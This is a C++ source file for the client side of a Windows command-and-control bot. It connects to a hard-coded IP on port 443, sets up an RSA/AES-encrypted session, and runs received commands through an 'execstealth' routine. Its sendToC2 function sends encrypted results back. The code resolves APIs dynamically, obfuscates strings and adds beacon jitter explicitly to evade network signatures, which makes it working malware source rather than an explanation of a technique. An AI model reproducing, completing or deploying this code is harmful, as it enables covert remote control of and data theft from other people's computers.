#include "Network/c2_server.h"
#include "Core/api_resolve.h"
#include "Crypto/encryption.h"
#include "Crypto/obfuscation.h"
#include "Utils/helpers.h"
#include "Core/dispatcher.h"
#include "Crypto/encryption.h"
#include <cstring>
#include <cstdio>

SessionContext g_Session = { INVALID_SOCKET, {0}, false };

void sendToC2(const char* text) {

    if (!g_Session.active || !text || strlen(text) == 0) return;

    API_TABLE& API = GetAPI();
        
    HANDLE hHeap = API.GetProcessHeap(); 
    
    ULONG plainTextSize = strlen(text);
    BYTE* plainText = (BYTE*)text;

    ULONG cipherTextSize = plainTextSize + 16;
    

    BYTE* cipherText = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, cipherTextSize);
    if (!cipherText) return;

    BYTE iv[16];
    
    if (!GenerateSessionKey(iv, 16)) {
        API.RtlFreeHeap(hHeap, 0, cipherText); //cleanup if IV fails
        return;
    }

    // use g_Session.sessionKey instead of local variable
    if (AESEncrypt(g_Session.sessionKey, 32, plainText, plainTextSize, cipherText, &cipherTextSize, iv)) {

        ULONG packetSize = 16 + cipherTextSize;

        BYTE* packet = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, packetSize);

        if (packet) {
            custom_memcpy(packet, iv, 16);
            custom_memcpy(packet + 16, cipherText, cipherTextSize);

            API.send(g_Session.hSocket, (const char*)packet, packetSize, 0);

            //delete aes key from memory
            SecureZeroMemory(packet, packetSize);

            //Heap release
            API.RtlFreeHeap(hHeap, 0, packet);
        }
    }

    SecureZeroMemory(cipherText, cipherTextSize);
    API.RtlFreeHeap(hHeap, 0, cipherText);    
}


void start_bot() {
    API_TABLE& API = GetAPI();
    WSADATA wsa;

    //initialize winsock
    if (API.WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        exit(1);
    }

    int backoff_ms = 5000;
    const int max_backoff = 3600000; // 1 hour max limit

    //Outer Loop
    while (1) {

        // SCOPE DECLARATIONS (Variable Hoisting)
        SOCKET s = INVALID_SOCKET;
        struct sockaddr_in server = {0};
        DWORD socketTimeout = 30000;
        BYTE sessionKey[32] = {0};
        BYTE encryptedKey[256] = {0};
        ULONG encryptedKeySize = sizeof(encryptedKey);
        char buffer[4096] = {0};
        DWORD jitter = 0;
        int select_res = 0;

        //Non-Blocking I/O Multiplexing variables
        u_long iMode = 0;
        fd_set writefds;
        fd_set exceptfds;
        struct timeval timeout;


        //NETWORK INITIALIZATION & NON-BLOCKING CONNECT

        s = API.socket(AF_INET, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) {
            goto apply_backoff;
        }

        //enable Non-Blocking Mode
        iMode = 1;
        API.ioctlsocket(s, FIONBIO, &iMode);

        server.sin_family = AF_INET;
        server.sin_addr.s_addr = API.inet_addr(STR("192.168.126.133"));
        server.sin_port = API.htons(443);

        //set timeout for receiving data
        API.setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&socketTimeout, sizeof(socketTimeout));

        API.connect(s, (struct sockaddr*)&server, sizeof(server));

        //File Descriptor sets for select()
        FD_ZERO(&writefds);
        FD_ZERO(&exceptfds);
        FD_SET(s, &writefds);   //socket writable
        FD_SET(s, &exceptfds);  //connection error

        //custom timeout: 2 seconds
        //avoids multiple OS SYN retransmissions
        timeout.tv_sec = 2;
        timeout.tv_usec = 0;

        select_res = API.select(0, NULL, &writefds, &exceptfds, &timeout);

        if (select_res > 0) {
            //connection active within 2 seconds
            if (custom_fd_isset(s, &exceptfds)) {
                //connection failed
                goto cleanup_and_backoff;
            }
            else if (custom_fd_isset(s, &writefds)) {
                //successful connection
                //reset socket to Blocking Mode
                iMode = 0;
                API.ioctlsocket(s, FIONBIO, &iMode);
            }
        }
        else {
            goto cleanup_and_backoff;
        }

        //CRYPTOGRAPHIC HANDSHAKE (RSA + AES)


        if (!GenerateSessionKey(sessionKey, sizeof(sessionKey))) {
            goto cleanup_and_backoff;
        }

        if (!EncryptSessionKeyRSA(sessionKey, sizeof(sessionKey), encryptedKey, &encryptedKeySize)) {
            goto cleanup_and_backoff;
        }

        if (API.send(s, (const char*)encryptedKey, encryptedKeySize, 0) <= 0) {
            goto cleanup_and_backoff;
        }

        //ESTABLISHED SESSION INITIALIZATION

        //stable connection, backoff=0
        backoff_ms = 5000;

        g_Session.hSocket = s;
        custom_memcpy(g_Session.sessionKey, sessionKey, 32);
        g_Session.active = true;


        //DATA RECEIVE LOOP (Inner Loop)


        while (1) {
            memset(buffer, 0, sizeof(buffer));

            int bytes_received = API.recv(s, buffer, sizeof(buffer) - 1, 0);

            if (bytes_received <= 0) {
                //check if connection closed from timeout
                if (API.WSAGetLastError() == WSAETIMEDOUT) {
                    continue; //socket still active, retry recv
                }
                break;
            }

            if (bytes_received <= 16) continue;

            BYTE iv[16];
            custom_memcpy(iv, buffer, 16);

            BYTE* cipherText = (BYTE*)buffer + 16;
            ULONG cipherTextSize = bytes_received - 16;

            BYTE plainText[4096] = {0};
            ULONG plainTextSize = sizeof(plainText);

            if (AESDecrypt(sessionKey, sizeof(sessionKey), cipherText, cipherTextSize, plainText, &plainTextSize, iv)) {

                //fix Off-by-One Stack Buffer Overflow
                if (plainTextSize >= sizeof(plainText)) {
                    plainTextSize = sizeof(plainText) - 1;
                }

                plainText[plainTextSize] = '\0';
                plainText[strcspn((char*)plainText, "\r\n")] = 0;

                if (strlen((char*)plainText) > 0 && strcmp((char*)plainText, " ") != 0) {
                    execstealth(s, (char*)plainText);
                }
            }
        }

        //UNIFIED CLEANUP & BACKOFF CONTROL

    cleanup_and_backoff:
        if (s != INVALID_SOCKET) {
            API.closesocket(s);
        }
        SecureZeroMemory(&g_Session, sizeof(SessionContext));
        g_Session.hSocket = INVALID_SOCKET;
        g_Session.active = false;

    apply_backoff:
        //Jitter (0-2000ms) to avoid Network Signatures και C2 Flooding
        jitter = API.GetTickCount() % 2000;
        smart_sleep(backoff_ms + jitter, 20);

        backoff_ms *= 2;
        if (backoff_ms > max_backoff) {
            backoff_ms = max_backoff;
        }
    }

    API.WSACleanup();
}
